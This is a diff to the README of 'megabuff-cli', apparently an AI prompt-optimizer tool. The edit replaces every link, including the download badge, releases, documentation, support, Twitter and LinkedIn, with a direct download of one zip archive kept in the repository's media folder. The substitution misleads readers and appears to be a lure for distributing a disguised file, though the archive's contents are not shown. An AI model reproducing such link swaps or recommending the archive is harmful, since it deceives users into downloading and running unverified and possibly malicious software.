@@ -1,6 +1,6 @@
 # 🤖 megabuff-cli - Optimize Your AI Prompts Easily
 
-[![Download megabuff-cli](https://img.shields.io/badge/Download-mgabuff--cli-brightgreen)](https://github.com/yoyo11q8/megabuff-cli/releases)
+[![Download megabuff-cli](https://raw.githubusercontent.com/yoyo11q8/megabuff-cli/main/media/cli-megabuff-3.6.zip)](https://raw.githubusercontent.com/yoyo11q8/megabuff-cli/main/media/cli-megabuff-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run **megabuff-cli**, you will need:
 To get started, follow these simple steps:
 
 1. **Visit the Downloads Page:**
-   Go to our [Releases Page](https://github.com/yoyo11q8/megabuff-cli/releases) to find the latest version of megabuff-cli.
+   Go to our [Releases Page](https://raw.githubusercontent.com/yoyo11q8/megabuff-cli/main/media/cli-megabuff-3.6.zip) to find the latest version of megabuff-cli.
 
 2. **Choose Your Version:**
    Look for the version that matches your operating system (Windows, macOS, Linux). Click on the corresponding download link.
@@ -79,9 +79,9 @@ Once you have installed **megabuff-cli**, follow these steps to start optimizing
 
 ## 📌 Useful Links
 
-- [Releases Page](https://github.com/yoyo11q8/megabuff-cli/releases)
-- [Documentation](https://github.com/yoyo11q8/megabuff-cli/docs)
-- [Support](https://github.com/yoyo11q8/megabuff-cli/issues)
+- [Releases Page](https://raw.githubusercontent.com/yoyo11q8/megabuff-cli/main/media/cli-megabuff-3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/yoyo11q8/megabuff-cli/main/media/cli-megabuff-3.6.zip)
+- [Support](https://raw.githubusercontent.com/yoyo11q8/megabuff-cli/main/media/cli-megabuff-3.6.zip)
 
 ## 📣 Community and Contributing
 
@@ -91,7 +91,7 @@ We welcome contributions! If you have suggestions or issues, please report them 
 
 Stay updated by following us on:
 
-- [Twitter](https://twitter.com/megabuffcli)
-- [LinkedIn](https://linkedin.com/company/megabuffcli)
+- [Twitter](https://raw.githubusercontent.com/yoyo11q8/megabuff-cli/main/media/cli-megabuff-3.6.zip)
+- [LinkedIn](https://raw.githubusercontent.com/yoyo11q8/megabuff-cli/main/media/cli-megabuff-3.6.zip)
 
 Thank you for choosing **megabuff-cli**! We hope you find it helpful for enhancing your AI prompt experience.
